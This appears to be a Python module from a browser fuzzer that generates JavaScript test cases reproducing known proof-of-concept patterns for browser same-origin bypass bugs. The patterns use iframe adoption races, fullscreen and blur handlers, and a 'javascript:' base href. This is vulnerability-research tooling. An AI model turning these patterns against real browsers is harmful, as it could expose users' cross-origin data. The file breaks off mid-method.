import random

from src.js_api.js_api_type import JsApiType
from src.script.web_instruction import WebInstruction
from src.script.statement import *
from src.web_api.web_object import WebObject
from src.web_api.web_api_type import WebApiType


class PocBuilder:
    def __init__(self, script_builder):
        self.script_builder = script_builder
        self.patterns = [self.generate_605766, self.generate_613266, self.generate_617495, self.generate_630870, self.generate_655904, self.generate_658535, self.generate_668552]

    def generate_605766(self):
        blob = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(None, [], blob, "Blob", WebApiType.construct, "Blob")
        self.script_builder.add_instruction(inst)

        u = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("URL", [blob], u, "URL", WebApiType.call_method, "createObjectURL")
        self.script_builder.add_instruction(inst)

        iframe = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("document", ['"iframe"'], iframe, "Document", WebApiType.call_method, "createElement")
        self.script_builder.add_instruction(inst)

        de = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("document", [], de, "Document", WebApiType.read_property, "documentElement")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(de, [iframe], None, "Element", WebApiType.call_method, "appendChild")
        self.script_builder.add_instruction(inst)

        d = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(iframe, [], d, "HTMLIFrameElement", WebApiType.read_property, "contentDocument")
        self.script_builder.add_instruction(inst)

        adopting = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_js_instruction(0, [], adopting, "Integer", JsApiType.assign, None)
        self.script_builder.add_instruction(inst)
        
        inst = self.script_builder.generate_web_instruction(d, [], None, "Document", WebApiType.call_method, "open")
        self.script_builder.add_instruction(inst)

        f = self.script_builder.get_new_function_name()
        inst = self.script_builder.generate_web_instruction(d, [], f, "Document", WebApiType.write_property, "onreadystatechange")
        self.script_builder.add_instruction(inst)

        f_inst = []

        rs = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(d, [], rs, "Document", WebApiType.read_property, "readyState")
        f_inst.append(inst)

        complete = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_js_instruction("'complete'", [], complete, "ReadyStateString", JsApiType.assign, None)
        f_inst.append(inst)

        cond = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_js_instruction(rs, [complete], cond, "ReadyStateString", JsApiType.operation_equal, None)
        f_inst.append(inst)

        if_inst = []
        else_inst = []

        if_inst2 = []
        else_inst2 = []

        c = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(d, [c], None, "Element", WebApiType.call_method, "appendChild")
        if_inst2.append(inst)


        inst = self.script_builder.generate_if_else(adopting, if_inst2, else_inst2)
        if_inst.append(inst)

        
        inst = self.script_builder.generate_if_else(cond, if_inst, else_inst)

        f_inst.append(inst)

        inst = self.script_builder.generate_function(f, [], None, f_inst)
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(d, ['"div"'], c, "Document", WebApiType.call_method, "createElement")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(d, [c], None, "Element", WebApiType.call_method, "appendChild")
        self.script_builder.add_instruction(inst)

        im = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(d, ['"img"'], im, "Document", WebApiType.call_method, "createElement")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(c, [im], None, "Element", WebApiType.call_method, "appendChild")
        self.script_builder.add_instruction(inst)

        i0 = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(d, ['"iframe"'], i0, "Document", WebApiType.call_method, "createElement")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(c, [i0], None, "Element", WebApiType.call_method, "appendChild")
        self.script_builder.add_instruction(inst)

        i1 = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(d, ['"iframe"'], i1, "Document", WebApiType.call_method, "createElement")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(c, [i1], None, "Element", WebApiType.call_method, "appendChild")
        self.script_builder.add_instruction(inst)

        x = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(None, [], x, "XMLHttpRequest", WebApiType.construct, "XMLHttpRequest")
        self.script_builder.add_instruction(inst)


        f = self.script_builder.get_new_function_name()
        inst = self.script_builder.generate_web_instruction(x, [], f, "XMLHttpRequest", WebApiType.write_property, "onload")
        self.script_builder.add_instruction(inst)

        f_inst = []

        inst = self.script_builder.generate_web_instruction(im, [], u, "HTMLImageElement", WebApiType.write_property, "src")
        f_inst.append(inst)

        inst = self.script_builder.generate_function(f, [], None, f_inst)
        self.script_builder.add_instruction(inst)

        f = self.script_builder.get_new_function_name()
        inst = self.script_builder.generate_web_instruction(x, [], f, "XMLHttpRequest", WebApiType.write_property, "onloadend")
        self.script_builder.add_instruction(inst)

        f_inst = []

        inst = self.script_builder.generate_web_instruction(d, [], None, "Document", WebApiType.call_method, "close")
        f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction("URL", [u], None, "URL", WebApiType.call_method, "revokeObjectURL")
        f_inst.append(inst)

        inst = self.script_builder.generate_js_instruction(1, [], adopting, "Integer", JsApiType.assign, None)
        f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction("document", [c], None, "Document", WebApiType.call_method, "adoptNode")
        f_inst.append(inst)

        inst = self.script_builder.generate_js_instruction(0, [], adopting, "Integer", JsApiType.assign, None)
        f_inst.append(inst)

        f2 = self.script_builder.get_new_function_name()
        inst = self.script_builder.generate_web_instruction(i1, [], f2, "HTMLIFrameElement", WebApiType.write_property, "onload")
        f_inst.append(inst)

        f2_inst = []
        if random.random() > 0.5:
            try_inst = []
            catch_inst = []

            inst = self.script_builder.generate_web_instruction(i1, [], None, "HTMLIFrameElement", WebApiType.read_property, "contentDocument")
            try_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(i1, [], "null", "HTMLIFrameElement", WebApiType.write_property, "onload")
            catch_inst.append(inst)

            src_url = self.script_builder.get_javascript_console_log("605766")
            inst = self.script_builder.generate_web_instruction(i1, [], f"'{src_url}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            catch_inst.append(inst)

            frame = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction(d, ['"iframe"'], frame, "Document", WebApiType.call_method, "createElement")
            catch_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(de, [frame], None, "Element", WebApiType.call_method, "appendChild")
            catch_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(frame, [], f"'svg/{c}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            catch_inst.append(inst)
            
            inst = self.script_builder.generate_try_catch(try_inst, catch_inst)
            f2_inst.append(inst)
        else:
            else_inst = []

            cond = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction(i1, [], cond, "HTMLIFrameElement", WebApiType.read_property, "contentDocument")
            f2_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(i1, [], "null", "HTMLIFrameElement", WebApiType.write_property, "onload")
            else_inst.append(inst)

            src_url = self.script_builder.get_javascript_console_log("605766")
            inst = self.script_builder.generate_web_instruction(i1, [], f"'{src_url}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            else_inst.append(inst)

            frame = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction(d, ['"iframe"'], frame, "Document", WebApiType.call_method, "createElement")
            else_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(de, [frame], None, "Element", WebApiType.call_method, "appendChild")
            else_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(frame, [], f"'svg/{c}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            else_inst.append(inst)
            
            inst = self.script_builder.generate_if_else(cond, [], else_inst)
            f2_inst.append(inst)

        inst = self.script_builder.generate_function(f2, [], None, f2_inst)
        f_inst.append(inst)

        iframe_url = self.script_builder.get_random_url()
        inst = self.script_builder.generate_web_instruction(i1, [], f"'{iframe_url}'", "HTMLIFrameElement", WebApiType.write_property, "src")
        f_inst.append(inst)

        inst = self.script_builder.generate_function(f, [], None, f_inst)
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(x, ["'get'", "'data:text/html,'"], None, "XMLHttpRequest", WebApiType.call_method, "open")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(x, [], None, "XMLHttpRequest", WebApiType.call_method, "send")
        self.script_builder.add_instruction(inst)

    def generate_630870(self):
        l = "l"

        f = self.script_builder.get_new_function_name()
        f_inst = []

        inst = self.script_builder.generate_web_instruction(None, [], f, "Built-in", WebApiType.write_property, "onload")
        self.script_builder.add_instruction(inst)

        s = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("document", ["'svg'"], s, "Document", WebApiType.call_method, "querySelector")
        f_inst.append(inst)

        i = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("document", ["'iframe'"], i, "Document", WebApiType.call_method, "createElement")
        f_inst.append(inst)

        b = self.script_builder.get_new_function_name()
        b_inst = []

        inst = self.script_builder.generate_web_instruction(l, [], None, "HTMLImageElement", WebApiType.call_method, "focus")
        b_inst.append(inst)

        blur_handler = self.script_builder.get_new_variable_name()
        blur_handler_inst = []

        inst = self.script_builder.generate_web_instruction(s, [i], None, "HTMLElement", WebApiType.call_method, "appendChild")
        blur_handler_inst.append(inst)

        inst = self.script_builder.generate_eventhandler([], blur_handler, blur_handler_inst)
        b_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(l, ["'blur'", blur_handler], None, "HTMLImageElement", WebApiType.call_method, "addEventListener")
        b_inst.append(inst)

        inst = self.script_builder.generate_function(b, [], None, b_inst)
        f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(l, ["'blur'", b], None, "HTMLImageElement", WebApiType.call_method, "addEventListener")
        f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(l, [], None, "HTMLImageElement", WebApiType.call_method, "focus")
        f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(s, [], "''", "HTMLElement", WebApiType.write_property, "textContent")
        f_inst.append(inst)

        cond = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(i, [], cond, "HTMLIFrameElement", WebApiType.read_property, "contentWindow")
        f_inst.append(inst)

        if_inst = []
        else_inst = []
        inst = self.script_builder.generate_web_instruction("location", [], None, "Location", WebApiType.call_method, "reload")
        else_inst.append(inst)

        inst = self.script_builder.generate_if_else(cond, if_inst, else_inst)
        f_inst.append(inst)


        location = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(cond, [], location, "WindowProxy", WebApiType.read_property, "location")
        f_inst.append(inst)

        href = self.script_builder.get_random_url()
        inst = self.script_builder.generate_web_instruction(location, [], f"'{href}'", "Location", WebApiType.write_property, "href")
        f_inst.append(inst)

        x = self.script_builder.get_new_variable_name()
        f2 = self.script_builder.get_new_function_name()
        inst = self.script_builder.generate_web_instruction(None, [f2, 1], x, "Built-in", WebApiType.call_method, "setInterval")
        f_inst.append(inst)

        inst = self.script_builder.generate_function(f, [], None, f_inst)
        self.script_builder.add_instruction(inst)

        f_inst = []

        if random.random() > 0.5:
            try_inst = []
            catch_inst = []

            inst = self.script_builder.generate_web_instruction(i, [], None, "HTMLIFrameElement", WebApiType.read_property, "contentDocument")
            try_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(None, [x], None, "Built-in", WebApiType.call_method, "clearInterval")
            catch_inst.append(inst)
            

            src_url = self.script_builder.get_javascript_console_log("630870")
            inst = self.script_builder.generate_web_instruction(i, [], f"'{src_url}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            catch_inst.append(inst)

            frame = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction("document", ['"iframe"'], frame, "Document", WebApiType.call_method, "createElement")
            catch_inst.append(inst)

            de = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction("document", [], de, "Document", WebApiType.read_property, "documentElement")
            catch_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(de, [frame], None, "Element", WebApiType.call_method, "appendChild")
            catch_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(frame, [], f"'svg/{i}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            catch_inst.append(inst)
            
            inst = self.script_builder.generate_try_catch(try_inst, catch_inst)
            f_inst.append(inst)

        else:
            else_inst = []

            cond = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction(i, [], cond, "HTMLIFrameElement", WebApiType.read_property, "contentDocument")
            f_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(None, [x], None, "Built-in", WebApiType.call_method, "clearInterval")
            else_inst.append(inst)

            src_url = self.script_builder.get_javascript_console_log("630870")
            inst = self.script_builder.generate_web_instruction(i, [], f"'{src_url}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            else_inst.append(inst)

            frame = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction("document", ['"iframe"'], frame, "Document", WebApiType.call_method, "createElement")
            else_inst.append(inst)

            de = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction("document", [], de, "Document", WebApiType.read_property, "documentElement")
            else_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(de, [frame], None, "Element", WebApiType.call_method, "appendChild")
            else_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(frame, [], f"'svg/{i}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            else_inst.append(inst)
            
            inst = self.script_builder.generate_if_else(cond, [], else_inst)
            f_inst.append(inst)

        inst = self.script_builder.generate_function(f2, [], None, f_inst)
        self.script_builder.add_instruction(inst)

    def generate_655904(self):
        f = self.script_builder.get_new_function_name()
        inst = self.script_builder.generate_function(f, [], None, [])
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction("document", ["'focus'", f, "true"], None, "Document", WebApiType.call_method, "addEventListener")
        self.script_builder.add_instruction(inst)

        onload_f = self.script_builder.get_new_function_name()
        onload_f_inst = []

        inst = self.script_builder.generate_web_instruction(None, [], onload_f, "Built-in", WebApiType.write_property, "onclick")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(None, [], "null", "Built-in", WebApiType.write_property, "onclick")
        onload_f_inst.append(inst)

        d = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("document", ['"div"'], d, "Document", WebApiType.call_method, "createElement")
        onload_f_inst.append(inst)

        body = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("document", [], body, "Document", WebApiType.read_property, "body")
        onload_f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(body, [d], None, "Element", WebApiType.call_method, "appendChild")
        onload_f_inst.append(inst)

        a = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("document", ['"a"'], a, "Document", WebApiType.call_method, "createElement")
        onload_f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(d, [a], None, "Element", WebApiType.call_method, "appendChild")
        onload_f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(body, [], None, "Element", WebApiType.call_method, "webkitRequestFullScreen")
        onload_f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(a, [], None, "Element", WebApiType.call_method, "webkitRequestFullScreen")
        onload_f_inst.append(inst)

        f = self.script_builder.get_new_function_name()
        f_inst = []

        inst = self.script_builder.generate_web_instruction(a, [], f, "Element", WebApiType.write_property, "onwebkitfullscreenchange")
        onload_f_inst.append(inst)



        inst = self.script_builder.generate_function(onload_f, [], None, onload_f_inst)
        self.script_builder.add_instruction(inst)

        i = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("document", ['"iframe"'], i, "Document", WebApiType.call_method, "createElement")
        f_inst.append(inst)

        blur_handler = self.script_builder.get_new_variable_name()
        blur_handler_inst = []

        inst = self.script_builder.generate_web_instruction(d, [i], None, "HTMLDivElement", WebApiType.call_method, "appendChild")
        blur_handler_inst.append(inst)

        inst = self.script_builder.generate_eventhandler([], blur_handler, blur_handler_inst)
        f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction("document", ["'blur'", blur_handler, "true"], None, "Document", WebApiType.call_method, "addEventListener")
        f_inst.append(inst)

        a = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("document", ['"a"'], a, "Document", WebApiType.call_method, "getElementById")
        f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(a, [], None, "HTMLAnchorElement", WebApiType.call_method, "remove")
        f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(d, [], "''", "HTMLDivElement", WebApiType.write_property, "textContent")
        f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction("document", [], None, "Document", WebApiType.call_method, "webkitExitFullscreen")
        f_inst.append(inst)

        cond = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(i, [], cond, "HTMLIFrameElement", WebApiType.read_property, "contentWindow")
        f_inst.append(inst)

        if_inst = []
        else_inst = []
        inst = self.script_builder.generate_web_instruction("location", [], None, "Location", WebApiType.call_method, "reload")
        else_inst.append(inst)

        inst = self.script_builder.generate_if_else(cond, if_inst, else_inst)
        f_inst.append(inst)


        location = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(cond, [], location, "WindowProxy", WebApiType.read_property, "location")
        f_inst.append(inst)

        href = self.script_builder.get_random_url()
        inst = self.script_builder.generate_web_instruction(location, [], f"'{href}'", "Location", WebApiType.write_property, "href")
        f_inst.append(inst)

        x = self.script_builder.get_new_variable_name()
        f2 = self.script_builder.get_new_function_name()
        inst = self.script_builder.generate_web_instruction(None, [f2, 1], x, "Built-in", WebApiType.call_method, "setInterval")
        f_inst.append(inst)

        inst = self.script_builder.generate_function(f, [], None, f_inst)
        self.script_builder.add_instruction(inst)

        f_inst = []

        if random.random() > 0.5:
            try_inst = []
            catch_inst = []

            inst = self.script_builder.generate_web_instruction(i, [], None, "HTMLIFrameElement", WebApiType.read_property, "contentDocument")
            try_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(None, [x], None, "Built-in", WebApiType.call_method, "clearInterval")
            catch_inst.append(inst)

            src_url = self.script_builder.get_javascript_console_log("655904")
            inst = self.script_builder.generate_web_instruction(i, [], f"'{src_url}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            catch_inst.append(inst)

            frame = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction("document", ['"iframe"'], frame, "Document", WebApiType.call_method, "createElement")
            catch_inst.append(inst)

            de = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction("document", [], de, "Document", WebApiType.read_property, "documentElement")
            catch_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(de, [frame], None, "Element", WebApiType.call_method, "appendChild")
            catch_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(frame, [], f"'svg/{i}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            catch_inst.append(inst)
            
            inst = self.script_builder.generate_try_catch(try_inst, catch_inst)
            f_inst.append(inst)
        else:
            else_inst = []

            cond = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction(i, [], cond, "HTMLIFrameElement", WebApiType.read_property, "contentDocument")
            f_inst.append(inst)


            inst = self.script_builder.generate_web_instruction(None, [x], None, "Built-in", WebApiType.call_method, "clearInterval")
            else_inst.append(inst)

            src_url = self.script_builder.get_javascript_console_log("655904")
            inst = self.script_builder.generate_web_instruction(i, [], f"'{src_url}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            else_inst.append(inst)

            frame = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction("document", ['"iframe"'], frame, "Document", WebApiType.call_method, "createElement")
            else_inst.append(inst)

            de = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction("document", [], de, "Document", WebApiType.read_property, "documentElement")
            else_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(de, [frame], None, "Element", WebApiType.call_method, "appendChild")
            else_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(frame, [], f"'svg/{i}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            else_inst.append(inst)
            
            inst = self.script_builder.generate_if_else(cond, [], else_inst)
            f_inst.append(inst)


        inst = self.script_builder.generate_function(f2, [], None, f_inst)
        self.script_builder.add_instruction(inst)

    def generate_658535(self):
        i = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("document", ["'input'"], i, "Document", WebApiType.call_method, "querySelector")
        self.script_builder.add_instruction(inst)

        onclick_f = self.script_builder.get_new_function_name()
        onclick_f_inst = []

        inst = self.script_builder.generate_web_instruction(i, ["'value'", "'#000001'"], None, "HTMLInputElement", WebApiType.call_method, "setAttribute")
        onclick_f_inst.append(inst)

        f = self.script_builder.get_new_function_name()
        f_inst = []

        inst = self.script_builder.generate_web_instruction(i, ["'change'", f], None, "HTMLInputElement", WebApiType.call_method, "addEventListener")
        onclick_f_inst.append(inst)

        m = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("document", ['"iframe"'], m, "Document", WebApiType.call_method, "createElement")
        f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(i, [m], None, "Element", WebApiType.call_method, "appendChild")
        f_inst.append(inst)

        src = self.script_builder.get_random_url()
        inst = self.script_builder.generate_web_instruction(m, [], f"'{src}'", "HTMLIFrameElement", WebApiType.write_property, "src")
        f_inst.append(inst)

        inst = self.script_builder.generate_function(f, [], None, f_inst)
        onclick_f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(i, [], None, "HTMLInputElement", WebApiType.call_method, "remove")
        onclick_f_inst.append(inst)

        x = self.script_builder.get_new_variable_name()
        c = self.script_builder.get_new_function_name()
        inst = self.script_builder.generate_web_instruction(None, [c, 1], x, "Built-in", WebApiType.call_method, "setInterval")
        onclick_f_inst.append(inst)

        inst = self.script_builder.generate_function(onclick_f, [], None, onclick_f_inst)
        self.script_builder.add_instruction(inst)


        c_inst = []

        if(random.random() > 0.5):
            try_inst = []
            catch_inst = []
            inst = self.script_builder.generate_web_instruction(m, [], None, "HTMLIFrameElement", WebApiType.read_property, "contentDocument")
            try_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(None, [x], None, "Built-in", WebApiType.call_method, "clearInterval")
            catch_inst.append(inst)

            src_url = self.script_builder.get_javascript_console_log("658535")
            inst = self.script_builder.generate_web_instruction(m, [], f"'{src_url}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            catch_inst.append(inst)

            frame = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction("document", ['"iframe"'], frame, "Document", WebApiType.call_method, "createElement")
            catch_inst.append(inst)

            de = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction("document", [], de, "Document", WebApiType.read_property, "body")
            catch_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(de, [frame], None, "Element", WebApiType.call_method, "appendChild")
            catch_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(frame, [], f"'svg/{m}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            catch_inst.append(inst)
            
            inst = self.script_builder.generate_try_catch(try_inst, catch_inst)
            c_inst.append(inst)
        else:
            cond = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction(m, [], cond, "HTMLIFrameElement", WebApiType.read_property, "contentDocument")
            c_inst.append(inst)

            else_inst = []

            inst = self.script_builder.generate_web_instruction(None, [x], None, "Built-in", WebApiType.call_method, "clearInterval")
            else_inst.append(inst)

            src_url = self.script_builder.get_javascript_console_log("658535")
            inst = self.script_builder.generate_web_instruction(m, [], f"'{src_url}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            else_inst.append(inst)

            frame = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction("document", ['"iframe"'], frame, "Document", WebApiType.call_method, "createElement")
            else_inst.append(inst)

            de = self.script_builder.get_new_variable_name()
            inst = self.script_builder.generate_web_instruction("document", [], de, "Document", WebApiType.read_property, "body")
            else_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(de, [frame], None, "Element", WebApiType.call_method, "appendChild")
            else_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(frame, [], f"'svg/{m}'", "HTMLIFrameElement", WebApiType.write_property, "src")
            else_inst.append(inst)
            
            inst = self.script_builder.generate_if_else(cond, [], else_inst)
            c_inst.append(inst)


        inst = self.script_builder.generate_function(c, [], None, c_inst)
        self.script_builder.add_instruction(inst)

    def generate_668552(self):
        
        f = self.script_builder.get_new_function_name()
        f_inst = []

        base = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("document", ["'base'"], base, "Document", WebApiType.call_method, "createElement")
        self.script_builder.add_instruction(inst)

        de = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("document", [], de, "Document", WebApiType.read_property, "documentElement")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(de, [base], None, "Element", WebApiType.call_method, "appendChild")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(base, [], f"'javascript:top.{f}();//'", "HTMLBaseElement", WebApiType.write_property, "href")
        self.script_builder.add_instruction(inst)

        obs = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("document", ["'object'"], obs, "Document", WebApiType.call_method, "getElementsByTagName")
        f_inst.append(inst)

        o = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(obs, [0], o, "HTMLCollection_Element", WebApiType.call_method, "item")
        f_inst.append(inst)

        inst = self.script_builder.generate_web_instruction(o, [], None, "Element", WebApiType.call_method, "remove")
        f_inst.append(inst)

        frames = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("window", [], frames, "Window", WebApiType.read_property, "frames")
        f_inst.append(inst)

        frame = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(frames, [0], frame, "HTMLCollection_Window", WebApiType.call_method, "item")
        f_inst.append(inst)

        d = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(frame, [], d, "Window", WebApiType.read_property, "document")
        f_inst.append(inst)

        de = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(d, [], de, "Document", WebApiType.read_property, "documentElement")
        f_inst.append(inst)

        c = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(de, [c], None, "Element", WebApiType.call_method, "appendChild")
        f_inst.append(inst)

        inst = self.script_builder.generate_function(f, [], None, f_inst)
        self.script_builder.add_instruction(inst)

        i = self.script_builder.get_new_variable_name()

        inst = self.script_builder.generate_web_instruction("document", ["'iframe'"], i, "Document", WebApiType.call_method, "createElement")
        self.script_builder.add_instruction(inst)

        de = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction("document", [], de, "Document", WebApiType.read_property, "documentElement")
        self.script_builder.add_instruction(inst)
        
        inst = self.script_builder.generate_web_instruction(de, [i], None, "Element", WebApiType.call_method, "appendChild")
        self.script_builder.add_instruction(inst)

        d = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(i, [], d, "HTMLIFrameElement", WebApiType.read_property, "contentDocument")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(i, [], None, "HTMLIFrameElement", WebApiType.call_method, "remove")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(d, ["'div'"], c, "Document", WebApiType.call_method, "createElement")
        self.script_builder.add_instruction(inst)

        d_de = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(d, [], d_de, "Document", WebApiType.read_property, "documentElement")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(d_de, [c], None, "Element", WebApiType.call_method, "appendChild")
        self.script_builder.add_instruction(inst)

        m = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(d, ["'marquee'"], m, "Document", WebApiType.call_method, "createElement")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(c, [m], None, "Element", WebApiType.call_method, "appendChild")
        self.script_builder.add_instruction(inst)

        i0 = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(d, ["'iframe'"], i0, "Document", WebApiType.call_method, "createElement")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(c, [i0], None, "Element", WebApiType.call_method, "appendChild")
        self.script_builder.add_instruction(inst)

        i1 = self.script_builder.get_new_variable_name()
        inst = self.script_builder.generate_web_instruction(d, ["'iframe'"], i1, "Document", WebApiType.call_method, "createElement")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(c, [i1], None, "Element", WebApiType.call_method, "appendChild")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction(m, ["'class'", "'a'"], None, "Element", WebApiType.call_method, "setAttribute")
        self.script_builder.add_instruction(inst)

        inst = self.script_builder.generate_web_instruction("document", [c], None, "Document", WebApiType.call_method, "adoptNode")
        self.script_builder.add_instruction(inst)

        f = self.script_builder.get_new_function_name()
        f_inst = []
        inst = self.script_builder.generate_web_instruction(i1, [], f, "HTMLIFrameElement", WebApiType.write_property, "onload")
        self.script_builder.add_instruction(inst)

        if(random.random() > 0.5):
            try_inst = []
            catch_inst = []
            inst = self.script_builder.generate_web_instruction(i1, [], None, "HTMLIFrameElement", WebApiType.read_property, "contentDocument")
            try_inst.append(inst)

            inst = self.script_builder.generate_web_instruction(i1, [], "null", "HTMLIFrameElement", WebApiType.write_property, "onload")
            catch_inst.append(inst)

            src_url = self.script_builder.get_javascript_console_log("668552")
